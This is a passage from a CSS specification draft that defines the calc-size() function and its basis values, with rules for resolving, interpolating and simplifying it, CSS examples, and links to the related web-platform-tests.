 test)]](http://wpt.live/css/css-values/calc-size/calc-size-flex-basis-on-column.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-flex-basis-on-column.html)
- [calc-size-flex-basis-on-row.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-flex-basis-on-row.html "css/css-values/calc-size/calc-size-flex-basis-on-row.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-flex-basis-on-row.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-flex-basis-on-row.html)
- [calc-size-grid-repeat.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-grid-repeat.html "css/css-values/calc-size/calc-size-grid-repeat.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-grid-repeat.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-grid-repeat.html)
- [calc-size-height-box-sizing.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-height-box-sizing.html "css/css-values/calc-size/calc-size-height-box-sizing.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-height-box-sizing.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-height-box-sizing.html)
- [calc-size-height.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-height.html "css/css-values/calc-size/calc-size-height.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-height.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-height.html)
- [calc-size-min-max-sizes-001.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-min-max-sizes-001.html "css/css-values/calc-size/calc-size-min-max-sizes-001.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-min-max-sizes-001.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-min-max-sizes-001.html)
- [calc-size-min-max-sizes-002.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-min-max-sizes-002.html "css/css-values/calc-size/calc-size-min-max-sizes-002.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-min-max-sizes-002.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-min-max-sizes-002.html)
- [calc-size-min-max-sizes-003.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-min-max-sizes-003.html "css/css-values/calc-size/calc-size-min-max-sizes-003.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-min-max-sizes-003.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-min-max-sizes-003.html)
- [calc-size-min-max-sizes-004.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-min-max-sizes-004.html "css/css-values/calc-size/calc-size-min-max-sizes-004.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-min-max-sizes-004.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-min-max-sizes-004.html)
- [calc-size-min-max-sizes-005.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-min-max-sizes-005.html "css/css-values/calc-size/calc-size-min-max-sizes-005.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-min-max-sizes-005.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-min-max-sizes-005.html)
- [calc-size-min-max-sizes-006.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-min-max-sizes-006.html "css/css-values/calc-size/calc-size-min-max-sizes-006.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-min-max-sizes-006.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-min-max-sizes-006.html)
- [calc-size-no-body-height-quirk-001.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-no-body-height-quirk-001.html "css/css-values/calc-size/calc-size-no-body-height-quirk-001.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-no-body-height-quirk-001.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-no-body-height-quirk-001.html)
- [calc-size-parsing.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-parsing.html "css/css-values/calc-size/calc-size-parsing.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-parsing.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-parsing.html)
- [calc-size-svg-001-crash.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-svg-001-crash.html "css/css-values/calc-size/calc-size-svg-001-crash.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-svg-001-crash.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-svg-001-crash.html)
- [calc-size-typed-om.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-typed-om.html "css/css-values/calc-size/calc-size-typed-om.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-typed-om.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-typed-om.html)
- [calc-size-width-box-sizing.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-width-box-sizing.html "css/css-values/calc-size/calc-size-width-box-sizing.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-width-box-sizing.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-width-box-sizing.html)
- [calc-size-width.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-width.html "css/css-values/calc-size/calc-size-width.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-width.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-width.html)
- [interpolate-size-computed.html](https://wpt.fyi/results/css/css-values/calc-size/interpolate-size-computed.html "css/css-values/calc-size/interpolate-size-computed.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/interpolate-size-computed.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/interpolate-size-computed.html)
- [interpolate-size-parsing.html](https://wpt.fyi/results/css/css-values/calc-size/interpolate-size-parsing.html "css/css-values/calc-size/interpolate-size-parsing.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/interpolate-size-parsing.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/interpolate-size-parsing.html)

Transitioning between two
[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) sizes, or slightly adjusting one, can
be done easily with
[calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc): halfway between [100%] and [20px]
is [calc(50% + 10px)], for example. But these operations are no
longer possible if the size you want to adjust or transition to/from is
a non-numeric value such as
[auto](https://drafts.csswg.org/css-sizing-3/#valdef-width-auto) or
[fit-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-fit-content) or a [cyclic percentage
size](https://drafts.csswg.org/css-sizing-3/#cyclic-percentage-size).
[\[CSS-SIZING-3\]](#biblio-css-sizing-3 "CSS Box Sizing Module Level 3")

The [calc-size()] function allows math and
transition/animation to be performed on these sizes in a safe,
well-defined way. Its syntax is as follows:

```
<calc-size()> = calc-size( <calc-size-basis>, <calc-sum> )
<calc-size-basis> = [ <size-keyword> | <calc-sum> | <calc-size()> | any ]
```

The first argument given is the [calc-size basis], which represents the size the
[calc-size()](#funcdef-calc-size) is based on, and the second is the [calc-size
calculation], which represents the size that
[calc-size()] will actually resolve
to, based on the [calc-size
basis](#calc-size-basis).

Some examples:

``` highlight
height: calc-size(auto, 0); /* used height is zero */
height: calc-size(auto, 50%); /* used height is 50% of the container */
height: calc-size(auto, size / 2); /* used height is 50% of auto */
height: calc-size(auto, size); /* used height is auto */
height: calc-size(auto, size + 10px); /* used height is auto + 10px */
height: calc-size(auto, round(up, size, 20px));
 /* used height is rounded up to the
 nearest multiple of 20px */
height: calc-size(any, size / 2); /* declaration is invalid */
```

The [calc-size basis](#calc-size-basis) values are:

[\<size-keyword\>]

: Indicates that the
 [calc-size()](#funcdef-calc-size) is basing its size off of the specified keyword.
 Represents any sizing keywords allowed in the context where the
 function is used. For example, in
 [width](https://drafts.csswg.org/css-sizing-3/#propdef-width), it matches
 [auto](https://drafts.csswg.org/css-sizing-3/#valdef-width-auto),
 [min-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-min-content),
 [stretch](https://drafts.csswg.org/css-sizing-3/#valdef-width-stretch), etc. Also allows any related sizing
 functions, like the
 [fit-content()](https://drafts.csswg.org/css-sizing-4/#funcdef-width-fit-content) function in [width]/etc., which is a variation of the
 [fit-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-fit-content) keyword. For all purposes other than
 actually resolving the size, the
 [calc-size()] acts like this
 keyword.

 The [calc-size
 calculation](#calc-size-calculation) will use the corresponding size as the value of its
 [size](#valdef-calc-size-size) keyword.

[[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum)]

: Indicates that the
 [calc-size()](#funcdef-calc-size) is basing its size off of the specified
 [calculation](https://drafts.csswg.org/css-values-4/#calc-calculation). For all purposes other than actually resolving the
 size, the [calc-size()] acts like
 this [calculation] wrapped in a
 [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) (including, for example, whether it
 represents a
 [definite](https://drafts.csswg.org/css-sizing-3/#definite) or
 [indefinite](https://drafts.csswg.org/css-sizing-3/#indefinite) size).

 The [calc-size
 calculation](#calc-size-calculation) will use the corresponding size as the value of its
 [size](#valdef-calc-size-size) keyword.

[[\<calc-size()\>](#funcdef-calc-size)]

: Indicates that the outer
 [calc-size()](#funcdef-calc-size) is basing its size off of this inner
 [calc-size()], and will share the
 same behavior as it.

 The [calc-size
 calculation](#calc-size-calculation) will use the size of the inner
 [calc-size()](#funcdef-calc-size) as its
 [size](#valdef-calc-size-size) keyword. The
 [size] keyword is allowed, in
 this case, even if the inner
 [calc-size()] uses
 [any](#valdef-calc-size-any).

 :::
 (#example-82e386de) For example, in
 [calc-size(calc-size(min-content, size / 2), size + 10%)], the
 outer [calc-size()](#funcdef-calc-size) acts as if its [calc-size
 basis](#calc-size-basis)
 was
 [min-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-min-content), and will calculate its own
 [size](#valdef-calc-size-size) using the result of the inner
 [calc-size()], equivalent to
 [calc-size(min-content, size / 2 + 10%)].
 :::

 Why can
 [calc-size()](#funcdef-calc-size) be nested?

 Allowing
 [calc-size()](#funcdef-calc-size) as the basis argument means that authors can use
 a variable as the basis (like [calc-size(var(\--foo), size +
 20px)]) and it will *always work* as long as the variable was
 originally valid for the property.

 Doing the same with just
 [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) doesn't work - for example, if you have
 [\--foo: calc-size(min-content, size + 20px)], or even just [\--foo: min-content],
 then [calc( (var(\--foo)) + 20px )] fails.

 The nesting is simplified away during interpolation, and at
 used-value time, so the basis always ends up as a simple value by
 the time interpolation and other effects occur; see [§ 11.2.1
 Simplifying calc-size()](#simplifying-calc-size).

[any]

: Indicates that the
 [calc-size()](#funcdef-calc-size) does not depend on any additional information,
 and thus can be interpolated with *any* other size. The
 [calc-size()] function represents
 a [definite
 size](https://drafts.csswg.org/css-sizing-3/#definite).

 The [calc-size
 calculation](#calc-size-calculation) cannot use the
 [size](#valdef-calc-size-size) keyword; it is a syntax error for
 [size] to appear in the
 [calc-size calculation].

 [calc-size(any, \...)] is mostly identical to
 [calc(\...)], but it is automatically interpolatable with
 other sizing keywords, regardless of the
 [interpolate-size](#propdef-interpolate-size) value. (It does treat
 percentages slightly differently, if the containing block's size is
 not
 [definite](https://drafts.csswg.org/css-sizing-3/#definite).)

For the purpose of sizing (including for [intrinsic size
contributions](https://drafts.csswg.org/css-sizing-3/#intrinsic-size-contribution)),
[calc-size()](#funcdef-calc-size) resolves to the result of its [calc-size
calculation](#calc-size-calculation).

For either argument, if a
[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) is given, its
[type](https://drafts.css-houdini.org/css-typed-om-1/#cssnumericvalue-type) must
[match](https://drafts.css-houdini.org/css-typed-om-1/#cssnumericvalue-match)
[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage), and it must resolve to a
[\<length\>](https://drafts.csswg.org/css-values-4/#length-value). See [CSS Values 4 § 10.9 Type
Checking](https://drafts.csswg.org/css-values-4/#calc-type-checking).
Like
[calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc), it inherits the property's [calculation
context](https://drafts.csswg.org/css-values-4/#calculation-contexts). However, a
[\<calc-size()\>](#funcdef-calc-size) is specifically *not* a
[\<length\>]; any place that wants
to accept [calc-size()] must
explicitly include it in its grammar.

Within the [calc-size
calculation](#calc-size-calculation), the [size]
is a
[\<calc-keyword\>](https://drafts.csswg.org/css-values-4/#typedef-calc-keyword) which is a
[\<length\>](https://drafts.csswg.org/css-values-4/#length-value), and resolves at [used
value](https://drafts.csswg.org/css-cascade-5/#used-value) time to the size specified above.

Why not just allow intrinsic keywords in
[calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc)?

In theory, rather than introducing
[calc-size()](#funcdef-calc-size), we could have defined [calc(auto \* .5)] to be
valid, allowing interpolation to work as normal.

This has the minor issue that mixing keywords still wouldn't be allowed,
but it wouldn't be as obvious (that is, [calc((min-content +
max-content)/2)] looks reasonable, but would be disallowed).

The larger issue, though, is that this wouldn't allow us to smoothly
transition percentages. [calc(50%)] is only half the size of
[calc(100%)] when percentages are
[definite](https://drafts.csswg.org/css-sizing-3/#definite) in the context; if they're not, the two values will
usually be the same size (depending on the context, either [0px]
or
[auto](https://drafts.csswg.org/css-sizing-3/#valdef-width-auto)-sized).

Using a new function that explicitly separates the size you're
calculating against from the calculation itself lets us get smooth
interpolation in *all* cases.

An additional consideration is that there are many effects, some small
and some large, that depend on whether an element is intrinsically sized
or definite. Consider, for example, [margin
collapsing](https://www.w3.org/TR/CSS2/box.html#collapsing-margins).
Using
[calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) would mean that the answer to the question "is
the element intrinsically-sized" can have one answer in the middle of a
transition ("yes", for [calc(min-content \* .2 + 20px \* .8))]),
but a different answer at the end of the transition ("no", for
[calc(20px)]), causing the layout to jump at the end of an
otherwise-smooth transition.

(This issue is similar to the stacking-layer changes that can occur when
animating from [opacity:1] to [opacity:
0](https://drafts.csswg.org/css-color-4/#propdef-opacity): any non-[1] value forces a stacking
context, but [1] does not. With
[opacity] you can get around this
by animating to [.999], which is visually indistinguishable from
[1] but forces a stacking context. It's not as reasonable to ask
people to animate to [calc(auto \* .0001)] to ensure it retains
its intrinsic-ness.)

Using a new function that identifies itself as nominally being a keyword
size, like [calc-size(auto, 20px)], means we can maintain stable
layout behaviors the entire time, even when the actual size is a
definite length.

### 11.1. Resolving [calc-size()]
Before [used
value](https://drafts.csswg.org/css-cascade-5/#used-value) time,
[calc-size()](#funcdef-calc-size) functions are not resolved or simplified. (But see
[§ 11.2 Interpolating calc-size()](#interpolate-calc-size).)

At [used
value](https://drafts.csswg.org/css-cascade-5/#used-value) time, the [calc-size
calculation](#calc-size-calculation) is resolved just like the value of a
[calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) expression, by substituting in the used value of
the [calc-size basis](#calc-size-basis) for the
[size](#valdef-calc-size-size) keyword in the [calc-size
calculation], and evaluating any
percentages normally (if they are
[definite](https://drafts.csswg.org/css-sizing-3/#definite)) or against [0px] (if they are not).

Percentages in the [calc-size
basis](#calc-size-basis)
resolve as normal so you can always smoothly transition to *any* size,
regardless of its value or behavior. For example, [calc-size(100%,
size)] is guaranteed to interpolate smoothly with [calc-size(100%,
0px)], producing intermediate values like [calc-size(100%, size \*
.5)]. Without
[calc-size()](#funcdef-calc-size), interpolation from [100%] to [0px] only
works as expected if the percentage is
[definite](https://drafts.csswg.org/css-sizing-3/#definite); otherwise, the intermediate values like
[calc(50%)] might all [behave as
auto](https://drafts.csswg.org/css-sizing-3/#behave-as-auto) and not change size at all.

Percentages in the [calc-size
calculation](#calc-size-calculation), on the other hand, are resolved to [0px] when
they would otherwise be indefinite, to avoid making the
[calc-size()](#funcdef-calc-size) potentially act in two different ways. There are some
cases where a
[min-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-min-content) size, for example, will cause different layout
effects than a [100%] size, and so a
[calc-size()] has to commit to one
behavior or the other.

### 11.2. Interpolating [calc-size()]
Tests

- [calc-size-height-interpolation.html](https://wpt.fyi/results/css/css-values/calc-size/animation/calc-size-height-interpolation.html "css/css-values/calc-size/animation/calc-size-height-interpolation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/calc-size-height-interpolation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/calc-size-height-interpolation.html)
- [calc-size-interpolation-expansion.html](https://wpt.fyi/results/css/css-values/calc-size/animation/calc-size-interpolation-expansion.html "css/css-values/calc-size/animation/calc-size-interpolation-expansion.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/calc-size-interpolation-expansion.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/calc-size-interpolation-expansion.html)
- [calc-size-width-interpolation.html](https://wpt.fyi/results/css/css-values/calc-size/animation/calc-size-width-interpolation.html "css/css-values/calc-size/animation/calc-size-width-interpolation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/calc-size-width-interpolation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/calc-size-width-interpolation.html)
- [interpolate-size-height-composition.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-height-composition.html "css/css-values/calc-size/animation/interpolate-size-height-composition.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-height-composition.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-height-composition.html)
- [interpolate-size-height-interpolation.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-height-interpolation.html "css/css-values/calc-size/animation/interpolate-size-height-interpolation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-height-interpolation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-height-interpolation.html)
- [interpolate-size-interpolation.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-interpolation.html "css/css-values/calc-size/animation/interpolate-size-interpolation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-interpolation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-interpolation.html)
- [interpolate-size-logical-properties-interpolation.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-logical-properties-interpolation.html "css/css-values/calc-size/animation/interpolate-size-logical-properties-interpolation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-logical-properties-interpolation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-logical-properties-interpolation.html)
- [interpolate-size-max-height-composition.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-max-height-composition.html "css/css-values/calc-size/animation/interpolate-size-max-height-composition.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-max-height-composition.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-max-height-composition.html)
- [interpolate-size-max-height-interpolation.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-max-height-interpolation.html "css/css-values/calc-size/animation/interpolate-size-max-height-interpolation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-max-height-interpolation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-max-height-interpolation.html)
- [interpolate-size-max-width-composition.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-max-width-composition.html "css/css-values/calc-size/animation/interpolate-size-max-width-composition.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-max-width-composition.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-max-width-composition.html)
- [interpolate-size-max-width-interpolation.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-max-width-interpolation.html "css/css-values/calc-size/animation/interpolate-size-max-width-interpolation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-max-width-interpolation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-max-width-interpolation.html)
- [interpolate-size-min-height-composition.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-min-height-composition.html "css/css-values/calc-size/animation/interpolate-size-min-height-composition.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-min-height-composition.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-min-height-composition.html)
- [interpolate-size-min-height-interpolation.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-min-height-interpolation.html "css/css-values/calc-size/animation/interpolate-size-min-height-interpolation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-min-height-interpolation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-min-height-interpolation.html)
- [interpolate-size-min-width-composition.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-min-width-composition.html "css/css-values/calc-size/animation/interpolate-size-min-width-composition.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-min-width-composition.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-min-width-composition.html)
- [interpolate-size-min-width-interpolation.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-min-width-interpolation.html "css/css-values/calc-size/animation/interpolate-size-min-width-interpolation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-min-width-interpolation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-min-width-interpolation.html)
- [interpolate-size-which-value.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-which-value.html "css/css-values/calc-size/animation/interpolate-size-which-value.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-which-value.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-which-value.html)
- [interpolate-size-width-composition.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-width-composition.html "css/css-values/calc-size/animation/interpolate-size-width-composition.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-width-composition.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-width-composition.html)
- [interpolate-size-width-interpolation.html](https://wpt.fyi/results/css/css-values/calc-size/animation/interpolate-size-width-interpolation.html "css/css-values/calc-size/animation/interpolate-size-width-interpolation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/animation/interpolate-size-width-interpolation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/animation/interpolate-size-width-interpolation.html)

Whether two
[calc-size()](#funcdef-calc-size) functions can be interpolated depends on their
[calc-size basis](#calc-size-basis) values (after being [prepared for
interpolation](#calc-size-prepare-for-interpolation)):

If either function returned failure from being [prepared for interpolation](#calc-size-prepare-for-interpolation)

: The values cannot be interpolated.

If they are identical

: The result's [calc-size
 basis](#calc-size-basis)
 is that basis value.

If either is [any](#valdef-calc-size-any)

: The result's [calc-size
 basis](#calc-size-basis)
 is the
 non-[any](#valdef-calc-size-any) basis.

Otherwise (if they don't match and neither side is [any](#valdef-calc-size-any))

: The values cannot be interpolated.

If they can be interpolated, the result's [calc-size
calculation](#calc-size-calculation) is the interpolation of the two input [calc-size
calculations].

 These interpolation restrictions ensure that a
[calc-size()](#funcdef-calc-size) doesn't try to act in two different ways at once.
There are some cases where a
[min-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-min-content) and
[max-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-max-content) would produce different layout behaviors, for
example, so the [calc-size()] has to
masquerade as one or the other. This, unfortunately, means you can't
transition between keywords, like going from
[auto](https://drafts.csswg.org/css-sizing-3/#valdef-width-auto) to
[min-content].

Some [calc-size()](#funcdef-calc-size) values can also be interpolated with a
[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) or an
[\<size-keyword\>](#typedef-calc-size-size-keyword). To determine whether the values can
interpolate and what the interpolation behavior is, treat the
non-[calc-size()] value as
[calc-size(any, `value` )] if the value is a
[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) or as [calc-size( `value`
, size)] otherwise, and apply the rules above.

For example,
[calc-size()](#funcdef-calc-size) allows interpolation to/from [height:
auto](https://drafts.csswg.org/css-sizing-3/#propdef-height):

```
details {
 transition: height 1s;
}
details::details-content {
 display: block;
}
details[open]::details-content {
 height: auto;
}
details:not([open])::details-content {
 height: calc-size(any, 0px);
}
```

This will implicitly interpolate between [calc-size(auto, size)]
and [calc-size(any, 0px)]. Half a second after opening the
[`details`](https://html.spec.whatwg.org/multipage/interactive-elements.html#the-details-element), the ::details-content wrapper's
[height](https://drafts.csswg.org/css-sizing-3/#propdef-height) will be [calc-size(auto, size \*
.5)], half its open size; thruout the transition it'll smoothly
animate its height.

 These rules allow [calc-size(any,
[definite](https://drafts.csswg.org/css-sizing-3/#definite) length)] to *always* interpolate smoothly,
regardless of how the other side of the transition is specified.

 This \"upgrade a plain value into a
[calc-size()](#funcdef-calc-size)\" behavior puts
[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) values into the [calc-size
calculation](#calc-size-calculation). This allows values with percentages to interpolate
with intrinsic size keywords, but does mean that when a percentage isn't
[definite](https://drafts.csswg.org/css-sizing-3/#definite), it'll resolve to zero. If you want to resolve to the
actual size the percentage would make the element, explicitly write a
[calc-size()] with the value in its
[calc-size basis](#calc-size-basis), like [calc-size(50%, size)].

#### 11.2.1. Simplifying [calc-size()]
Identically to [math
functions](https://drafts.csswg.org/css-values-4/#math-function), the [calc-size
calculation](#calc-size-calculation) (and [calc-size
basis](#calc-size-basis), if
it's a
[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum)) of a
[calc-size()](#funcdef-calc-size) function is
[simplified](https://drafts.csswg.org/css-values-4/#simplify-a-calculation-tree) at [specified
value](https://drafts.csswg.org/css-cascade-5/#specified-value) and [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) time.

Before
[interpolation](https://drafts.csswg.org/css-values-4/#interpolation),
[calc-size()](#funcdef-calc-size) functions are [prepared for
interpolation](#calc-size-prepare-for-interpolation) so their [calc-size
basises](#calc-size-basis)
can be compared, and their [calc-size
calculations](#calc-size-calculation) can be interpolated properly. This is a more involved
process than [simplifying a calculation
tree](https://drafts.csswg.org/css-values-4/#simplify-a-calculation-tree), and can potentially fail.

To [prepare for interpolation] a
[calc-size()](#funcdef-calc-size) function:

1. First, simplify the [calc-size
 basis](#calc-size-basis), recursing as needed:

 If the [calc-size basis](#calc-size-basis) is a [calc-size()](#funcdef-calc-size) function itself

 : The [calc-size
 basis](#calc-size-basis) of the outer function is replaced with that of
 the inner function, and the inner function's [calc-size
 calculation](#calc-size-calculation) is
 [substituted](#substitute-into-a-calc-size-calculation) into the outer function's [calc-size
 calculation].

 Otherwise, if the [calc-size basis](#calc-size-basis) is a [\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) whose [type](https://drafts.css-houdini.org/css-typed-om-1/#cssnumericvalue-type) [matches](https://drafts.css-houdini.org/css-typed-om-1/#cssnumericvalue-match) [\<length\>](https://drafts.csswg.org/css-values-4/#length-value) (no percentage present)

 : Replace the basis with [any], and the original basis is
 [substituted](#substitute-into-a-calc-size-calculation) into the [calc-size
 calculation](#calc-size-calculation).

 Otherwise, if the [calc-size basis](#calc-size-basis) is any other [\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) (contains a percentage)

 : Replace the basis with [100%] and the original basis is
 [de-percentified](#de-percentify-a-calc-size-calculation), then
 [substituted](#substitute-into-a-calc-size-calculation) into the [calc-size
 calculation](#calc-size-calculation).

 If any [substitute into a calc-size
 calculation](#substitute-into-a-calc-size-calculation) returns failure, the entire operation immediately
 returns failure.

2. Next, simplify the [calc-size
 calculation](#calc-size-calculation) as defined in [CSS Values 4 § 10.10.1
 Simplification](https://drafts.csswg.org/css-values-4/#calc-simplification).

 After simplification, the [calc-size
basis](#calc-size-basis) of
a [calc-size()](#funcdef-calc-size) function will either be a single keyword or the value
[100%].

To [substitute into a calc-size
calculation] `calc` a value
`insertion value`:

1. If `calc` doesn't have the
 [size](#valdef-calc-size-size) keyword in it, do nothing.

2. Otherwise, replace every instance of the
